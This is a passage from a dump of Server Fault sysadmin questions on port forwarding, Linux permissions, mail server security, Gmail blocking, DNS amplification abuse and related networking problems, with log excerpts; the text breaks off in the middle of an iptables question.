"889832","Router TP-Link TL-WDR4300 not Forwarding ports","<p>Although I configured the forwarding ports in my router they are closed.</p>

<p>I have a <strong>TP-Link TL-WDR4300</strong> router connected to my home network. I also have a <strong>TP-Link TL-WA850RE</strong> repeater working as a Wi-Fi extender.</p>

<ol>
<li>Logged into the WDR4300</li>
<li>Navigated to <strong>Forwarding</strong> > <strong>Virtual Servers</strong></li>
<li><p>Clicked on <strong>Add New</strong>:</p>

<ul>
<li><strong>Service Port:</strong> 80</li>
<li><strong>Internal Port:</strong> 80</li>
<li><strong>IP Address:</strong> 192.168.0.103 <em>(This is also reserved into the DHCP Server)</em></li>
<li><strong>Protocol:</strong> ALL</li>
<li><strong>Status:</strong> Enabled</li>
</ul></li>
<li><p>Clicked on <strong>Save</strong></p></li>
<li>Just in case I rebooted the router.</li>
</ol>

<p>These were the steps I did use to configure the <strong><em>Forwarding ports</em></strong>, after all this I have checked several online Port checkers and the <code>port 80</code> is still closed.</p>

<p>Just in case I stopped my AV and Firewall, but nothing happened.</p>

<p>Any ideas what's stopping me from opening ports in the router?</p>
","<networking><router><port-forwarding><local-area-network><tp-link>","2017-12-28 04:16:06"
"820137","Multiple partitions on one disk in esxi","<p>I know it is not recommended to have multiple partitions on a single drive. But I want to have two drives handling the VMs in a mirror with separate partitions. But I cant create more datastores on a drive. I think i can be done since I have been able to do it on other esxi systems before. The ""New datastore"" in the corner of the page where my disks shows up is grey. I have tried using the partedUtil tool but I cannot seem to get it. </p>

<p>It would be great if someone could point me in the right direction. </p>

<p>Thanks.</p>
","<vmware-esxi>","2016-12-12 00:58:31"
"820158","Hosting a small PHP web app with Lightsail","<p>I am building a small and very simple web app for users in a company. It's built on vanilla PHP and MySQL, no frameworks and it is very lightweight. I am new to hosting and I'm wondering if Amazon Lightsail would be a good solution for hosting everything. I think EC2 and RDS would be too excessive for what I am trying to accomplish. What is the best way to go about hosting the PHP and database?</p>
","<php><amazon-web-services><amazon-lightsail>","2016-12-12 04:52:15"
"820235","Hide IIS from network","<p>I installed iis on Windows to host a test website, but it's shared to everyone on the network. Is there a way to disable this so it is not shared to any other computers?</p>
","<iis>","2016-12-12 14:54:52"
"820246","Check for file by wildcard and store as variable in batch file","<p>I am looking for a way to check a specified folder for a file. I will not have the complete file name, so I will have to use wildcards.  After finding the file, I want to store the filename as a variable.</p>
","<batch-file>","2016-12-12 15:48:00"
"820277","EL5 /etc/hosts.deny not denying "".top""?","<p>I get spam e-mails from places such as whatever@hungry.lmtaken.top 
among a LOT of others.
I have an appropriate entry in /etc/hosts.deny but it doesn't seem to 
block anything from the .top domain.   See below.  Is it wrong?
I tried simply "".top"" as the entry below but it didn't work either.</p>

<p>sendmail: .*.top</p>

<p>Thanks in advance to anyone who can help.</p>
","<linux><sendmail><spam><rhel5><hosts.deny>","2016-12-12 17:54:06"
"820285","Ethernet Router, switch and network routes","<p>Say I have the following network setup with about 100 clients connected:</p>

<p>1 GbE Ethernet/Internet -> GbE Router -> 1 GbE Ethernet -> GbE Switch -> Clients</p>

<p>Clients receive their IP:s from the router's DHCP server, but after that, if two clients want to communicate, can they do so directly over the switch or will their communication still have to pass through the router?</p>

<p>Will the single 1 GbE connection between the router and switch be a potential bottleneck if, say, Client A and B transfer large files on the local network while Client C, D and E are downloading files from the Internet?</p>
","<router><switch><gigabit-ethernet>","2016-12-12 18:29:28"
"820301","Windows Server 2016 containers?","<p>Can someone clear this up?</p>

<p>The Windows Server 2016 container technology is Docker correct?
And an oversimplified assumption it's some Hyper-v translation layer between Docker and Windows?</p>

<ul>
<li>Can you dockerize pure Win32 applications?</li>
<li>Or is it just used to run existing linux based Docker containers?</li>
<li>For Windows based app you can Dockerize .Net Core applications?</li>
</ul>
","<docker><windows-server-2016>","2016-12-12 20:01:14"
"820361","Understanding use-case of Puppet in Windows deployment automation","<p>I have to automate few tasks in Windows environment. Technologies in use are MS SQL Server 2008, IIS, MSMQ etc. All dependencies for running the application are installed on a single machine. However, on production environment, dependencies are setup on different instances. Installation of dependencies (SQL server, IIS, etc) on any instance are all manual as of now.</p>

<p>First thing that i am planning to do is to create a base image which would contain all the dependent components (softwares). I think Puppet and Powershell along with Jenkins will help me in this. I am new to both Puppet and Powershell.</p>

<p>My goal is:<br>
1) to automate installation of softwares on base machine.<br>
2) use this image on all (or most) environments (Dev, Integration, Staging, UAT, Production)</p>

<p>Both the above steps should be automated.</p>

<p>Now the confusion that i have is if i use Powershell for say, installing SQL server (and other softwares too), then where does Puppet comes into picture? I can invoke this Powershell script from Jenkins to deploy on different environments by using custom config files for environments. Am i not understanding the real use-case of Puppet here? Should i be actually using any other tool such as Docker etc? Please guide me.</p>
","<windows-server-2008><sql-server><powershell><puppet><docker>","2016-12-13 06:35:23"
"820426","Which hypervisors use full/para virtualization?","<p>So I kind of understand what the difference is between full virtualization and para virtualization. </p>

<p>With full virtualization, the guest OS doesn't know that it is being virtualized. 
With para virtualization, the guest OS needs to know that it is virtualized in order to take advantage of the functions. </p>

<p>I'm comparing four hypervisors: KVM, Red Hat Virtualization 4, vSphere 6.5 and Windows Server 2016 Hyper-V. Now I'm wondering which ones use full virtualization and which ones use para virtualization. As far as I've seen some of them can make use of both but I don't know in which situations which one is used. </p>
","<virtualization><hypervisor>","2016-12-13 14:16:38"
"820468","HP Elite 8300 SFF - Recovery without Recovery Partition... where's my image?","<p>I'm trying to re-image my machine... at the moment it doesn't have <em>ANY</em> os on it, as the drive has been wiped, thus any recovery images are gone, too.</p>

<p>This poses a problem when I'm reinstalling Windows: I am being prompted for a license key, which I don't have since it's stored in the BIOS (and no longer on the side of the box on a sticker).</p>

<p>Where can I find an image to install that will pull the license from the BIOS, OR, is there a way I can scrape the license out of the BIOS by, say, booting into a Windows PE, slackware, something else?</p>

<p>Thank you!</p>
","<windows-8><formatting><reinstall>","2016-12-13 17:33:29"
"820506","Windows 10 Installation Failure New Server","<p>Bought a Brand New Server with windows 10 installed.  The initial boot up was fine.  Added a new hard drive and put the system in a raid 0 setup.  Ran the install CD, installation went fine.  On reboot on first install, system would not boot because drive configuration was not set to uefi.  Enabled uefi and system booted fine.  After about 10 minutes after the initial setup I installed chrome.  PC Crashed (blue screen).  Error was “Unable to write to read only memory”  On reboot, system came up normal, tried to open up chrome, chrome would crash randomly.  Opened up internet explorer, attempted to download chrome again, when running install, says the download file was corrupted.  Tried to download any file to the computer, all files say, the file was corrupted unable to run install.  Thought maybe windows got corrupted some how in the blue screen of death.  Attempted to reinstall windows fresh from provided restore disk, when reinstalling windows, installation now fails saying files corrupted unable to continue install.  Removed Raid configuration in bios and attempted to install windows on both separate drives individually in ahci mode.  Keeps throwing error about corrupted files.  Both are brand new hard drives. Tried to install Ubuntu same issue. Am I something?  </p>

<p>Note: I was installing windows just to make sure everything was working fine.</p>

<p>Specs:</p>

<p>AMD FX8350 4.0GHZ
DDR3 1600MHZ 8GB Ram
2 Individual Hard Drives.  Initial setup AHCI, Attempted setup raid 0.
Asus Motherboard</p>

<p>Issue:  No matter what I try to install, it says files are corrupted.  Could this be related to the processor? Or Possibly Ram issue?</p>
","<installation><windows-10><raid0><failed>","2016-12-13 20:05:57"
"820716","Understanding Linux Permissions - Apache with user ""apache""","<p>I'm with some problems understanding the Linux Permissions, users/groups.</p>

<p>I'm running a PHP Web Application with Apache. The user running Apache is the linux user ""apache"".</p>

<p>The folder with the PHP Web Application have the files and folders assigned to the user ""andre"". I've assigned the user ""apache"" to the group ""andre"".</p>

<pre><code>[2016-12-14 15:51:01] Espo.WARNING: E_WARNING: touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied {""code"":2,""message"":""touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied"",""file"":""/var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php"",""line"":518,""context"":{""filePath"":""data/cache/application/cronLastRunTime.php"",""defaultPermissions"":{""dir"":""0775"",""file"":""0664"",""user"":48,""group"":48},""pathParts"":{""dirname"":""data/cache/application"",""basename"":""cronLastRunTime.php"",""extension"":""php"",""filename"":""cronLastRunTime""}}} []
[2016-12-14 15:51:01] Espo.ERROR: Uncaught Exception Espo\Core\Exceptions\Error: ""Permission denied for data/cache/application/cronLastRunTime.php"" at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php line 212 {""exception"":""[object] (Espo\\Core\\Exceptions\\Error(code: 500): Permission denied for data/cache/application/cronLastRunTime.php at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php:212)""} []
[2016-12-14 15:52:01] Espo.WARNING: E_WARNING: touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied {""code"":2,""message"":""touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied"",""file"":""/var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php"",""line"":518,""context"":{""filePath"":""data/cache/application/cronLastRunTime.php"",""defaultPermissions"":{""dir"":""0775"",""file"":""0664"",""user"":48,""group"":48},""pathParts"":{""dirname"":""data/cache/application"",""basename"":""cronLastRunTime.php"",""extension"":""php"",""filename"":""cronLastRunTime""}}} []
[2016-12-14 15:52:01] Espo.ERROR: Uncaught Exception Espo\Core\Exceptions\Error: ""Permission denied for data/cache/application/cronLastRunTime.php"" at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php line 212 {""exception"":""[object] (Espo\\Core\\Exceptions\\Error(code: 500): Permission denied for data/cache/application/cronLastRunTime.php at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php:212)""} []
[2016-12-14 15:53:01] Espo.WARNING: E_WARNING: touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied {""code"":2,""message"":""touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied"",""file"":""/var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php"",""line"":518,""context"":{""filePath"":""data/cache/application/cronLastRunTime.php"",""defaultPermissions"":{""dir"":""0775"",""file"":""0664"",""user"":48,""group"":48},""pathParts"":{""dirname"":""data/cache/application"",""basename"":""cronLastRunTime.php"",""extension"":""php"",""filename"":""cronLastRunTime""}}} []
[2016-12-14 15:53:01] Espo.ERROR: Uncaught Exception Espo\Core\Exceptions\Error: ""Permission denied for data/cache/application/cronLastRunTime.php"" at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php line 212 {""exception"":""[object] (Espo\\Core\\Exceptions\\Error(code: 500): Permission denied for data/cache/application/cronLastRunTime.php at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php:212)""} []
[2016-12-14 15:54:01] Espo.WARNING: E_WARNING: touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied {""code"":2,""message"":""touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied"",""file"":""/var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php"",""line"":518,""context"":{""filePath"":""data/cache/application/cronLastRunTime.php"",""defaultPermissions"":{""dir"":""0775"",""file"":""0664"",""user"":48,""group"":48},""pathParts"":{""dirname"":""data/cache/application"",""basename"":""cronLastRunTime.php"",""extension"":""php"",""filename"":""cronLastRunTime""}}} []
[2016-12-14 15:54:01] Espo.ERROR: Uncaught Exception Espo\Core\Exceptions\Error: ""Permission denied for data/cache/application/cronLastRunTime.php"" at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php line 212 {""exception"":""[object] (Espo\\Core\\Exceptions\\Error(code: 500): Permission denied for data/cache/application/cronLastRunTime.php at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php:212)""} []
[2016-12-14 15:55:02] Espo.WARNING: E_WARNING: touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied {""code"":2,""message"":""touch(): Unable to create file data/cache/application/cronLastRunTime.php because Permission denied"",""file"":""/var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php"",""line"":518,""context"":{""filePath"":""data/cache/application/cronLastRunTime.php"",""defaultPermissions"":{""dir"":""0775"",""file"":""0664"",""user"":48,""group"":48},""pathParts"":{""dirname"":""data/cache/application"",""basename"":""cronLastRunTime.php"",""extension"":""php"",""filename"":""cronLastRunTime""}}} []
[2016-12-14 15:55:02] Espo.ERROR: Uncaught Exception Espo\Core\Exceptions\Error: ""Permission denied for data/cache/application/cronLastRunTime.php"" at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php line 212 {""exception"":""[object] (Espo\\Core\\Exceptions\\Error(code: 500): Permission denied for data/cache/application/cronLastRunTime.php at /var/www/somewebsitefolder/public/application/Espo/Core/Utils/File/Manager.php:212)""} []
</code></pre>

<p>Here is my /etc/group</p>

<pre><code>root:x:0:apache
apache:x:48:
andre:x:1000:apache
</code></pre>

<p>Should I add the user ""andre"" to the group ""apache"" to get rid of this errors?</p>

<p>Best Regards,
André Lopes.</p>
","<user-permissions>","2016-12-14 16:59:32"
"889923","""Bad Data"" Error in IIS when using Central Certificates","<p>I am using Central Certificates in IIS 10 - using a local folder (C:\iis\Encryption) that is synchronized to all of the web servers in our cluster.</p>

<p>The Central IIS uses a domain service account - one which seemingly has full permissions to the folder (and files) in question:</p>

<p><a href=""https://i.sstatic.net/Kphve.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/Kphve.png"" alt=""enter image description here""></a></p>

<p>Everything was working until we needed to renew the certificate - which I did by deleting the old .PFX files in the share and uploading new ones.</p>

<p>Now, when I use the service account in the configuration, I am getting an error that says ""Bad Data"".</p>

<p><a href=""https://i.sstatic.net/qhxJq.png"" rel=""nofollow noreferrer""><img src=""https://i.sstatic.net/qhxJq.png"" alt=""enter image description here""></a></p>

<p>When I instead use my personal Domain Account, it seems to work fine. Also, when I put back the old (soon to expire) certificate into the folder, that works fine with the service account.</p>

<p>Why isn't my service account working anymore</p>
","<iis><centralized-certificates>","2017-12-28 20:28:52"
"820812","Adding static routes","<p>I'm kind of new in networks and I have to add static routes to few networks on CentOS. Here are 2 questions that I have:</p>

<ol>
<li><p>How to add this: <code>10.10.x.x/16</code> is this valid entry and is this mean all IP's on <code>x.x</code> will be valid?</p></li>
<li><p>If I'm understand correctly I need to create file with the name of the interface via which will be routing in <code>/etc/sysconfig/network-scripts</code>. Is that correct? </p></li>
</ol>
","<networking><centos><routing>","2016-12-15 06:40:01"
"890009","find bottleneck of a slow server centos","<p>I have a virtual machine host running Centos 6. It is serving an android application with apache/php/mysql. 
When online users gets high in number , the server responds very slowly. Even ssh connection to the server becomes slow.</p>

<p>So how can I find what is the bottleneck for this and how to fix it? Is it low RAM or a lot of hard disk write/read , high cpu usage , and which program is causing this?</p>

<p>This is the output of free -m in normal situations:</p>

<pre><code>             total       used       free     shared    buffers     cached
Mem:          1877       1714        162          0         16        202
-/+ buffers/cache:       1495        381
Swap:         1023        231        792
</code></pre>

<p>Output of htop in normal situation:
<a href=""https://i.sstatic.net/uVwwS.png"" rel=""nofollow noreferrer"">Output of htop</a></p>
","<mysql><centos6><bottleneck>","2017-12-29 15:16:21"
"890143","Unable to SSH/Ping but can FTP/Connect to Apache","<p>I've gone away for a couple of days and left my machine running at home. I was doing some stuff on it over ssh just before I left and it was working fine. I got to the hotel and connected to the wifi, the first thing I did was try and SSH into my server, only putty gave me a ""Connection Refused"" error. Thinking this was odd, I visited the URL on chrome, and the website works fine. Next I tried <code>ping</code>ing the server but I keep on getting timeouts.
Getting desperate at this point I ftp'd in over FileZilla - seamless. </p>

<p><code>tracert</code> tells me that the packet reaches <code>109.159.253.86</code> ok and then timeouts from there - IP lookup tells me that that appears to be some kind of BT distribution center (I'm on BT at home - maybe BT are blocking the port or something?)</p>

<p>Using the windows <code>telnet</code> command I seem to confirm my suspicions that for whatever reason, port 22 is blocked. Ports 80 and 21 (Apache and FTP respectively) will connect albeit with bad protocol errors, however with port 22 again I get <code>connection refused</code></p>

<p>This isn't the first time I've <code>SSH</code>'d into this machine from outside of my local network and I haven't had any problems before, the only difference is I'm in the middle of nowhere and thus I'm using the slow slow hotel wifi but usually I use 4G from my phone's personal hotspot, althought I don't see why that would make</p>

<p>For the next couple of days at least, I'm going to be constrained to fixes I can do over non-root FTP. I had an idea to maybe shift SSH operation over to another, more obscure port which I have open for a game server but I would need root-mode FTP and some way to restart the SSH service, any help would be appreciated</p>

<p><strong>tl;dr</strong></p>

<ul>
<li><code>FTP</code> and Apache work</li>
<li><code>ping</code> and <code>SSH</code> DONT work</li>
<li>I can connect to ports 80 and 21</li>
<li>I cannot connect to port 22</li>
<li>I don't have physical access to my machine</li>
</ul>
","<ubuntu><networking><connection>","2017-12-30 22:56:39"
"820981","assessing the security concerns for running an own email server","<p>I'm working at a small research center that has to manage a lot of things independently on a tight budget. One of these is all things IT infrastructure, including web and email hosting. Though I've not been formed as a system administrator, I've so far succeeded in finding an affordable root server at a hosting company, setting up our websites and web applications, and keeping them running for a couple of years.</p>

<p>So far, our email has been hosted externally, which means that we pay little for little value: 875Mb email storage space for max. 35 POP-mailboxes. After a couple of data-losses due to local inbox corruptions in email clients, I've decided to at least investigate the option of using the postfix / qmail mail server that's present on the root server we're hiring. At first sight, there are many advantages: we'd be able to switch to virtually unlimited IMAP accounts, include the email in the email accounts in the server backups, use more storage per mailbox, etc. On top of that, the mail server is already included in the fee we're paying for the webserver, so we could cut the external email hosting cost and even get much more for less.</p>

<p>The technical part has been fun enough: I've been able to set it all up (discovering the virtues of the Plesk panel) and in principle we could just switch to the new email server right away. Yet, I'm not confident I can properly estimate the risks involved in managing an email server, security wise. Of course, I have SpamAssassin and antivirus (Plesk Premium antivirus) enabled on all email accounts, set up an SSH certificate and added SPF, DMARC, and DKIM records to our DNS. My major concern is: does this suffice, and what are the chances of being attacked and having the entire server compromised?</p>

<p>For example, I've noticed how -even in this premature testing phase-, the QMail logs are full of messages such as:</p>

<pre><code>Dec 15 17:07:00 server4545 postfix/smtpd[23838]: connect from unknown[91.200.13.5]
Dec 15 17:07:00 server4545 plesk_saslauthd[24512]: Invalid mail address 'albert@'
Dec 15 17:07:00 server4545 postfix/smtpd[23838]: warning: unknown[91.200.13.5]: SASL LOGIN authentication failed: authentication failure
Dec 15 17:07:00 server4545 postfix/smtpd[23838]: lost connection after AUTH from unknown[91.200.13.5]
Dec 15 17:07:00 server4545 postfix/smtpd[23838]: disconnect from unknown[91.200.13.5]
Dec 15 17:07:04 server4545 postfix/smtpd[23838]: connect from 24-35-233-74.fidnet.com[24.35.233.74]
Dec 15 17:07:04 server4545 postfix/smtpd[23838]: lost connection after CONNECT from 24-35-233-74.fidnet.com[24.35.233.74]
Dec 15 17:07:04 server4545 postfix/smtpd[23838]: disconnect from 24-35-233-74.fidnet.com[24.35.233.74]
Dec 15 17:07:20 server4545 postfix/smtpd[23838]: warning: hostname ip-address-pool-xxx.fpt.vn does not resolve to address 118.71.172.216: Name or service not known
Dec 15 17:07:20 server4545 postfix/smtpd[23838]: connect from unknown[118.71.172.216]
Dec 15 17:07:22 server4545 postfix/smtpd[23838]: NOQUEUE: reject: RCPT from unknown[118.71.172.216]: 554 5.7.1 &lt;name@ourdomain.com&gt;: Relay access denied; from=&lt;voicemailandfax@jgnluxwatch.com&gt; to=&lt;name@ourdomain.com&gt; proto=ESMTP helo=&lt;[100.74.205.159]&gt;
Dec 15 17:07:22 server4545 postfix/smtpd[23838]: disconnect from unknown[118.71.172.216]
Dec 15 17:07:22 server4545 /usr/lib/plesk-9.0/psa-pc-remote[8577]: Message aborted.
Dec 15 17:07:22 server4545 /usr/lib/plesk-9.0/psa-pc-remote[8577]: Message aborted.
</code></pre>

<p>This seems to suggest a lot of interest from totally unrelated IP addresses, even though I'm currently not even using the thing for testing. The good part seems to be that those attempts are being recognized and rejected, but still I'm wondering where they come from and how much I should worry. Even if they are innocent, I can imagine processing all those requests could cause serious overhead for the server. For testing purposes, I have added an MX record with low priority in our DNS; I wonder if this already is 'inviting' so many requests to our mail server?</p>

<p>In other words: I'm looking for reasonable advice on the security risks involved in running an own mail server. After all, if things break, they might break everything and I'll have to deal with it myself.</p>

<p>Any advice would be much appreciated!</p>

<p>Ron</p>
","<security><email-server><server-setup>","2016-12-15 19:07:57"
"821069","How to find out where a domain resolves to","<p>Hi,</p>

<p>lets say threre is a site called mypage.com but I want to find out whats the actual URL where domain resolves to. It usually is something like 123.45.67/~mypage/www. How will you do it?</p>

<p>Thank you.</p>
","<domain>","2016-12-16 05:41:07"
"821146","Multi-core processor - what is the meaning of this?","<p>I am baffled by the terminologies like <code>Core i3</code>, <code>Core i</code>5 etc. Does <code>Core i3</code> means <strong>three physical CPU's (three physical Chips)? or three cpu's in a SINGLE CHIP?</strong></p>

<p>I did try to find this information online, but my doubts still remain the same, can anyone help me understand this in simple words?</p>
","<central-processing-unit><multi-core>","2016-12-16 14:52:46"
"821240","Gmail blocking e-mail from my personal domain","<p>For some reason Gmail has started blocking e-mail from my domain (flanigan.net). </p>

<p>I have had DKIM (opendkim), DMARC (opendmarc), and SPF implemented for some time. I am not on any of the SPAM or issues list that I can find. I have no history of bad behavior or issues, and I have no problem with sending e-mail to any other domain (yahoo, outlook.com, etc, etc). </p>

<p>The message I get back is unhelpful. I have filled in all the forms and done all the Gmail help guides I can find. </p>

<p>I just do e-mail from home use and for some friends and charities I support. All said and done only 40 users. Again no history of issues or SPAM. </p>

<p>Bounced Message Headers below: </p>

<blockquote>
  <p>Subject: Returned mail: see transcript for details
  Date: 2016-12-16 11:10
  From: Mail Delivery Subsystem 
  To: </p>
  
  <p>The original message was received at Fri, 16 Dec 2016 11:10:19 -0500 from     >ns1.flanigan.net [IPv6:::1]</p>
  
  <p>----- The following addresses had permanent fatal errors ----- >>
       (reason: 550-5.7.1 [2600:3c02::f03c:91ff:fe89:bda4      12] Our 
  system has detected that)</p>
  
  <p>----- Transcript of session follows ----- ... while talking to gmail-smtp-in.l.google.com.:
   DATA
   550-5.7.1 [2600:3c02::f03c:91ff:fe89:bda4      12] Our system has 
  detected that
  550-5.7.1 this message is likely unsolicited mail. To reduce the amount of spam  550-5.7.1 sent to Gmail, this message has been blocked. Please visit &lt;&lt;&lt; 550-5.7.1 <a href=""https://support.google.com/mail/?p=UnsolicitedMessageError"" rel=""nofollow noreferrer"">https://support.google.com/mail/?p=UnsolicitedMessageError</a>
  550 5.7.1  for more information. u1si2266860ywd.269 - gsmtp
  554 5.0.0 Service unavailable</p>
  
  <p>Reporting-MTA: dns; ns1.flanigan.net
  Arrival-Date: Fri, 16 Dec 2016 11:10:19 -0500</p>
</blockquote>
","<sendmail><gmail><opendkim>","2016-12-16 21:22:41"
"890524","What to do if system administrator does not support system image?","<p>In case of a system failure, I wanted to create a system image. However, it requires administrative password. System admin asked me why you want to create a system image; because we don't support it already.</p>

<p>What to do if the system image is not supported by the admin? Does it make sense to insist on creating an image or asking something else such as ""back-up the system""?</p>

<p>Thanks!</p>
","<windows-7><disk-image>","2018-01-03 12:53:10"
"821359","Protect server ports from being used for attacks","<p>I'm a programmer and I just know some basic &amp; web development related thing like managing dns, adding websites to iis &amp;...</p>

<p>I have had two different servers and both of them was shut down because my server was used for launching attacks on other servers.</p>

<p>I have always used very strong passwords 
I always have the windows firewall on
Just opened the ports that are used for mail, sql server &amp; ftp</p>

<p>But still have problems with server security. I want to know </p>

<p><strong>Where to start</strong></p>

<p><strong>What should I read or search about</strong></p>

<p><strong>Can free antivirus products help me with this?</strong> (Becuase right now I don't have the budget to buy expensive softwares)</p>

<p>These are the sample attack reports that last time I had received from the data center (which I didn't understood a bit):</p>

<pre><code>2016-04-06 18:00:14.448433 IP (tos 0x0, ttl 109, id 32364, offset 0, flags [+], proto UDP (17), length 1500) 148.251.78.182.53 &gt; 66.150.188.x.53233: 17222| 247/0/1 amplists.com. A 192.168.1.150, amplists.com.[|domain]
x0000: 4500 05dc 7e6c 2000 6d11 c6ba 94fb 4eb6 E...~l..m.....N.
x0010: 4296 bca2 0035 cff1 0fa1 8245 4346 8380 B....5.....ECF..
x0020: 0001 00f7 0000 0001 0861 6d70 6c69 7374 .........amplist
x0030: 7303 636f 6d00 00ff 0001 c00c 0001 0001 s.com...........
x0040: 0000 2527 0004 c0a8 0196 c00c 0001 0001 ..%'............
x0050: 0000 ..

2016-04-06 18:00:14.448501 IP (tos 0x0, ttl 109, id 32365, offset 0, flags [+], proto UDP (17), length 1500) 148.251.78.182.53 &gt; 66.150.188.x.53233: 17222| 247/0/1 amplists.com. A 192.168.1.150, amplists.com.[|domain]
x0000: 4500 05dc 7e6d 2000 6d11 c6b9 94fb 4eb6 E...~m..m.....N.
x0010: 4296 bca2 0035 cff1 0fa1 8245 4346 8380 B....5.....ECF..
x0020: 0001 00f7 0000 0001 0861 6d70 6c69 7374 .........amplist
x0030: 7303 636f 6d00 00ff 0001 c00c 0001 0001 s.com...........
x0040: 0000 2527 0004 c0a8 0196 c00c 0001 0001 ..%'............
x0050: 0000 ..

2016-04-06 18:00:14.448503 IP (tos 0x0, ttl 109, id 32366, offset 0, flags [+], proto UDP (17), length 1500) 148.251.78.182.53 &gt; 66.150.188.x.53233: 17222| 247/0/1 amplists.com. A 192.168.1.150, amplists.com.[|domain]
x0000: 4500 05dc 7e6e 2000 6d11 c6b8 94fb 4eb6 E...~n..m.....N.
x0010: 4296 bca2 0035 cff1 0fa1 8245 4346 8380 B....5.....ECF..
x0020: 0001 00f7 0000 0001 0861 6d70 6c69 7374 .........amplist
x0030: 7303 636f 6d00 00ff 0001 c00c 0001 0001 s.com...........
x0040: 0000 2527 0004 c0a8 0196 c00c 0001 0001 ..%'............
x0050: 0000 
</code></pre>
","<windows><security><windows-server-2012-r2>","2016-12-17 23:21:13"
"890583","Shocking ESD damage, what more can be done?","<p>Today, over $6,000 in networking equipment was destroyed. Remarkably, the main circuit SPD, power strips and APCs are fine. Ethernet seems to be the method of surge transmission, as everything connected to the physical network up until the fiber links was fried. What makes this event unique (for me) is the flash, bolt of lightning, ball fire and loud bang that was observed.</p>

<p>I’m surprised by this damage. First, because the room is protected by grounded perimeter (and centerline) copper wire with frequent aerials. Second, we have a good ground network. And third, the bolt observed was at least 1 meter away from the plastic conduit that carried the network cables.</p>

<p>We’re in an area with extreme lightning activity and up until now, I thought we had done a good job of protecting the network.</p>

<p>So, what more can be done? Should our Ethernet cables be put into large grounded metal conduit? Or, a grounded cage above the plastic conduit?</p>

<p>The ceiling space the Ethernet conduit is run in has metal studs and a roof above. Should we go so far as installing direct grounding from the stud network? Or, would that simply make things worse by “drawing” future strikes into the studs increasing EMF damage risk?</p>
","<networking><local-area-network><ethernet><surge-protection>","2018-01-03 18:41:47"
"821361","Sending message to two clients behind one public IP","<p>So recently I have been developing a simple UDP server and client application (using C# with .NET), however I seem to have hit a dead end and am in need of advice.</p>

<p>The current situation is that the client is listening to port xx and the server is listening on a different port called x. See this <a href=""https://i.sstatic.net/GkUMk.png"" rel=""nofollow noreferrer"">image</a>.</p>

<p>The public IP of the server is known by the client and port x is forwarded so that the server is able to receive messages from clients sending messages via port x.</p>

<p>As apart of any message sent by the client, the public IP of the client is sent to the server, so that the server may send a response back to that client.</p>

<p>My current testing has shown that this works reasonably well, until, there are two clients behind one public IP.</p>

<p>This causes a problem because packets of data sent by the server either arrive at the wrong computer or don't ever get received (I think the router just discards them because it can't figure out which one to send it to).</p>

<p>So what advice/methods can you give me to fix this issue?</p>

<p>Best Regards,
Ashley.</p>
","<firewall><port>","2016-12-17 23:27:59"
"890589","Which configuration file for apache2 VirtualHost?","<p>I have a VPS and I'd like to associate two domains to the VPS in different directories. I read I shall configure in Apache some <code>VirtualHost</code> tags in some configuration file. Which configuration file is that? Where it is stored in my ubuntu machine?</p>

<p>The folder tree I have for Apache is this:</p>

<pre><code>/etc/apache2/
|-- apache2.conf
|       `--  ports.conf
|-- mods-enabled
|       |-- *.load
|       `-- *.conf
|-- conf-enabled
|       `-- *.conf
|-- sites-enabled
|       `-- *.conf
|-- sites-available
|       `-- *.conf         
</code></pre>

<p>Is it in <code>sites-enabled/</code> or <code>sites-available/</code>? In which file? My version is <code>Apache/2.4.7 (Ubuntu)</code></p>
","<apache2>","2018-01-03 20:13:00"
"821375","Available options for editing remote files without uploading","<p><strong>Objective:</strong> Edit remote files that are either too large to upload or can't be moved outside of the host environment.</p>

<p>I've heard people mention the <code>vim</code> editor (or <code>nano</code>/<code>pico</code> etc.) when it comes to editing remote files over ssh. However, I'm unaware (and curious) of any other ways to do this.</p>

<p>What are some other ways of achieving this, perhaps even through a GUI program or at least without ssh+local-editor.</p>

<p>*Which option is best for less powerful servers like say a Raspberry Pi?</p>
","<command-line-interface><files><remote><graphical-user-interface>","2016-12-18 01:34:42"
"890653","How to show if ip address exists in AWS instances with AWS SDK on python?","<p>i have a easy question. I need to show, if ip address exists or if ip address does not exists in simple condition. Little part of my code:</p>

<pre><code>for i in ec2.instances.all():
    if i.public_ip_address == '192.168.1.1':
        print('yes')
    else:
        print('no')
</code></pre>

<p>But please look, if i am starting script, i have:</p>

<pre><code>no
no
yes
no
no
no
no
no
no
no
</code></pre>

<p>So ... It is going to check all list of ip addresses. But i need only one checking. I want to receive result 'yes' or 'no'. How to do in this situation ? Thanks for help.</p>
","<amazon-web-services><python><boto>","2018-01-04 08:43:30"
"821411","port forward with iptables and debian","<p>I've a lan, a server and a VM</p>

<pre><code>lan: 192.168.50.0/24
linux server: 192.168.50.3
linux VM guest: 192.168.50.1 (with apache)
</code></pre>

<p>I want that linux server redirect all requests from lan and port 80 to 192.168.50.1:80</p>

<p>I use these without results :-/</p>

<pre><code>iptables -A PREROUTING -t nat -i eth0 -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
iptables -A FORWARD -p tcp -d 192.168.50.1 --dport 80 -j ACCEPT
